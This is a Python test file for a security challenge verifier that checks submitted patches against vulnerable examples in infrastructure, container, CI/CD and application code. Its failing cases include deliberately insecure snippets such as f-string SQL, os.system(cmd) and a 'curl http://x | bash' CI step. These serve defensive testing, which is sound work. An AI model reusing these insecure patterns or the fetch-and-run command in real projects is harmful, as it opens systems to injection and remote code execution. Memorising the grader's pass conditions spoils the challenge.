from app.services.arena.registry import verify_patch


def _verify(challenge_id, code):
    result = verify_patch(challenge_id, code)
    return result.success, result.message


def test_iac_validator_pass_and_fail():
    assert _verify("IAC_1", "resource \"x\" \"y\" { encrypted = true }")[0] is True
    assert _verify("IAC_1", "resource \"x\" \"y\" { encrypted = false }")[0] is False


def test_network_validator_pass_and_fail():
    assert _verify("NET_1", "cidr_blocks = [\"10.0.0.0/24\"]")[0] is True
    assert _verify("NET_1", "cidr_blocks = [\"0.0.0.0/0\"]")[0] is False


def test_identity_validator_pass_and_fail():
    assert _verify("ID_1", "secret = os.environ['SECRET']")[0] is True
    assert _verify("ID_1", "secret = 'HARDCODED_SECRET_VALUE'")[0] is False


def test_container_validator_pass_and_fail():
    assert _verify("CONT_1", "USER app\nCOPY . /app")[0] is True
    assert _verify("CONT_1", "USER root\nCOPY . /app")[0] is False


def test_kubernetes_validator_pass_and_fail():
    assert _verify("K8S_1", "securityContext:\n  runAsNonRoot: true")[0] is True
    assert _verify("K8S_1", "securityContext:\n  runAsUser: 0")[0] is False


def test_cloud_architecture_validator_pass_and_fail():
    assert _verify("ARCH_1", '{"Action": "s3:GetObject", "Resource": "arn"}')[0] is True
    assert _verify("ARCH_1", '{"Action": "*", "Resource": "*"}')[0] is False


def test_serverless_validator_pass_and_fail():
    assert _verify("SLS_1", "validate(event['name']); subprocess.run(cmd)")[0] is True
    assert _verify("SLS_1", "subprocess.run(event['name'])")[0] is False


def test_cicd_validator_pass_and_fail():
    assert _verify("CICD_1", "on: [pull_request]\npermissions: read-all")[0] is True
    assert _verify("CICD_1", "on: pull_request_target\nrun: curl http://x | bash")[0] is False


def test_live_validator_pass_and_fail():
    assert _verify("LIVE_REAL_100", 'cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))')[0] is True
    assert _verify("LIVE_REAL_100", "query = f\"SELECT * FROM users WHERE id = '{user_id}'\"")[0] is False


def test_legacy_cwe_validator_pass_and_fail():
    assert _verify("cwe79", "{{ user.bio }}")[0] is True
    assert _verify("cwe79", "{{ user.bio | safe }}")[0] is False


def test_unknown_challenge_fails_closed():
    success, message = _verify("UNKNOWN_1", "secure = true")
    assert success is False
    assert "failed closed" in message


def test_live_real_harden_verification_robust():
    # 1. SQL Injection (LIVE_REAL_100)
    # Empty string
    assert _verify("LIVE_REAL_100", "")[0] is False
    # Unrelated string
    assert _verify("LIVE_REAL_100", "fixed")[0] is False
    # Generic comment
    assert _verify("LIVE_REAL_100", "# SQLi query fixed")[0] is False
    # Positive SQLi
    assert _verify("LIVE_REAL_100", "cursor.execute(\"SELECT * FROM logs WHERE id = ?\", (event_id,))")[0] is True
    # Negative SQLi (Interpolation)
    assert _verify("LIVE_REAL_100", "query = f\"SELECT * FROM logs WHERE id = {id}\"\ndb.execute(query)")[0] is False
    # Negative SQLi (No parameterization placeholder)
    assert _verify("LIVE_REAL_100", "cursor.execute(\"SELECT * FROM logs\")")[0] is False

    # 2. Path Traversal (LIVE_REAL_101)
    # Empty string
    assert _verify("LIVE_REAL_101", "")[0] is False
    # Unrelated string
    assert _verify("LIVE_REAL_101", "fixed")[0] is False
    # Generic comment
    assert _verify("LIVE_REAL_101", "// path traversal fixed")[0] is False
    # Positive Path Traversal (sanitize/replace)
    assert _verify("LIVE_REAL_101", "const path = req.query.path.replace(/\\.\\.\\//g, '');\nconst data = fs.readFileSync(path);")[0] is True
    # Negative Path Traversal (with ../)
    assert _verify("LIVE_REAL_101", "const data = fs.readFileSync('/app/data/../' + path);")[0] is False
    # Negative Path Traversal (no replace/sanitize)
    assert _verify("LIVE_REAL_101", "const data = fs.readFileSync('/app/data/' + req.query.path);")[0] is False

    # 3. RCE (LIVE_REAL_102)
    # Empty string
    assert _verify("LIVE_REAL_102", "")[0] is False
    # Unrelated string
    assert _verify("LIVE_REAL_102", "fixed")[0] is False
    # Generic comment
    assert _verify("LIVE_REAL_102", "# RCE command injection fixed")[0] is False
    # Positive RCE (constrained allowlist subprocess)
    assert _verify("LIVE_REAL_102", "import subprocess\nif cmd in allowlist:\n    subprocess.run(cmd)")[0] is True
    # Negative RCE (unsafe os.system)
    assert _verify("LIVE_REAL_102", "os.system(cmd)")[0] is False
    # Negative RCE (unconstrained subprocess)
    assert _verify("LIVE_REAL_102", "subprocess.run(cmd)")[0] is False

    # 4. S3 Policy (LIVE_REAL_103)
    # Empty string
    assert _verify("LIVE_REAL_103", "")[0] is False
    # Unrelated string
    assert _verify("LIVE_REAL_103", "fixed")[0] is False
    # Generic comment
    assert _verify("LIVE_REAL_103", "# S3 policy wildcard Principal * fixed")[0] is False
    # Positive S3 Policy
    assert _verify("LIVE_REAL_103", "Principal = \"arn:aws:iam::123456789012:role/S3Reader\"")[0] is True
    # Negative S3 Policy (wildcard *)
    assert _verify("LIVE_REAL_103", "Principal = \"*\"")[0] is False
    # Negative S3 Policy (missing principal)
    assert _verify("LIVE_REAL_103", "Action = \"s3:GetObject\"")[0] is False

    # 5. XSS (LIVE_REAL_104)
    # Empty string
    assert _verify("LIVE_REAL_104", "")[0] is False
    # Unrelated string
    assert _verify("LIVE_REAL_104", "fixed")[0] is False
    # Generic comment
    assert _verify("LIVE_REAL_104", "<!-- HTML XSS filter | safe fixed -->")[0] is False
    # Positive XSS (removing safe)
    assert _verify("LIVE_REAL_104", "<div>{{ user_input }}</div>")[0] is True
    # Negative XSS (unsafe | safe)
    assert _verify("LIVE_REAL_104", "<div>{{ user_input | safe }}</div>")[0] is False

    # 6. Default config hardening (LIVE_REAL_105)
    # Empty string
    assert _verify("LIVE_REAL_105", "")[0] is False
    # Unrelated string
    assert _verify("LIVE_REAL_105", "fixed")[0] is False
    # Generic comment
    assert _verify("LIVE_REAL_105", "# default config check fixed")[0] is False
    # Positive config hardening
    assert _verify("LIVE_REAL_105", "status: secured\nsecurity_check: passed")[0] is True
    # Negative config hardening (vulnerable active/pending)
    assert _verify("LIVE_REAL_105", "status: active\nsecurity_check: passed")[0] is False
    assert _verify("LIVE_REAL_105", "status: secured\nsecurity_check: pending")[0] is False
    assert _verify("LIVE_REAL_105", "status: active\nsecurity_check: pending")[0] is False
    # Negative config hardening (missing status)
    assert _verify("LIVE_REAL_105", "security_check: passed")[0] is False

    # 7. Forged/Invalid challenge IDs
    assert _verify("LIVE_REAL_99", "cursor.execute(...)")[0] is False
    assert _verify("LIVE_REAL_106", "status: secured")[0] is False
    assert _verify("LIVE_REAL_abc", "status: secured")[0] is False

